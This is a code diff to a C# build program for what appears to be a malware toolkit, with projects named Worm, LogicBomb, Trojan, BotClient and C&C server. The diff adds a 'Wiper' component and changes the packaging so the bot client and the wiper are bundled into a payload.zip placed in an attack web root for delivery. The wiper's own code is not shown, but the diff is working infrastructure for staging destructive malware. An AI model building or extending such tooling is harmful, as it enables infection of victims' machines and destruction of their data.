@@ -38,6 +38,9 @@ namespace Builder
                 BuildProject("LogicBomb");
                 BuildProject("Worm");
 
+                // --- NEW: Build Wiper ---
+                BuildProject("Wiper");
+
                 // Build attacker toolkit components
                 BuildProject("BotClient");
                 BuildProject("AttackerControlPanel");
@@ -195,10 +198,43 @@ namespace Builder
         {
             LogInfo("Creating 'attack' folder structure...");
 
-            string botClientOutputDir = FindBuildOutputDirectory("BotClient");
-            string zipPath = Path.Combine(WwwRootDir, "payload.zip");
-            ZipFile.CreateFromDirectory(botClientOutputDir, zipPath);
-            LogSuccess("Packaged BotClient into attack/wwwroot/payload.zip");
+            //string botClientOutputDir = FindBuildOutputDirectory("BotClient");
+            //string zipPath = Path.Combine(WwwRootDir, "payload.zip");
+            //ZipFile.CreateFromDirectory(botClientOutputDir, zipPath);
+            //LogSuccess("Packaged BotClient into attack/wwwroot/payload.zip");
+            LogInfo("Structuring payload with Wiper subfolder...");
+
+            // 1. Tạo thư mục tạm để sắp xếp file
+            string tempStagingDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
+            Directory.CreateDirectory(tempStagingDir);
+
+            try
+            {
+                // 2. Copy BotClient vào thư mục gốc của Temp
+                string botClientOutputDir = FindBuildOutputDirectory("BotClient");
+                CopyDirectoryContents(botClientOutputDir, tempStagingDir);
+
+                // 3. Tạo thư mục con "wiper" trong Temp
+                string wiperSubDir = Path.Combine(tempStagingDir, "wiper");
+                Directory.CreateDirectory(wiperSubDir);
+
+                // 4. Copy Wiper vào thư mục con "wiper"
+                string wiperOutputDir = FindBuildOutputDirectory("Wiper");
+                CopyDirectoryContents(wiperOutputDir, wiperSubDir);
+
+                // 5. Nén thư mục Temp thành payload.zip
+                string zipPath = Path.Combine(WwwRootDir, "payload.zip");
+                ZipFile.CreateFromDirectory(tempStagingDir, zipPath);
+                LogSuccess("Packaged BotClient + Wiper into attack/wwwroot/payload.zip");
+            }
+            finally
+            {
+                // Dọn dẹp thư mục tạm
+                if (Directory.Exists(tempStagingDir))
+                {
+                    Directory.Delete(tempStagingDir, true);
+                }
+            }
 
             // --- FIXED: Use the correct folder name with '&' ---
             string cncServerOutputDir = FindBuildOutputDirectory("C&CServer");
@@ -287,7 +323,7 @@ namespace Builder
             try
             {
                 // --- FIXED: Use the correct folder name with '&' ---
-                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto", "BotClient", "AttackerControlPanel", "C&CServer" };
+                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto", "BotClient", "AttackerControlPanel", "C&CServer", "Wiper" };
 
                 foreach (string project in projectsToClean)
                 {
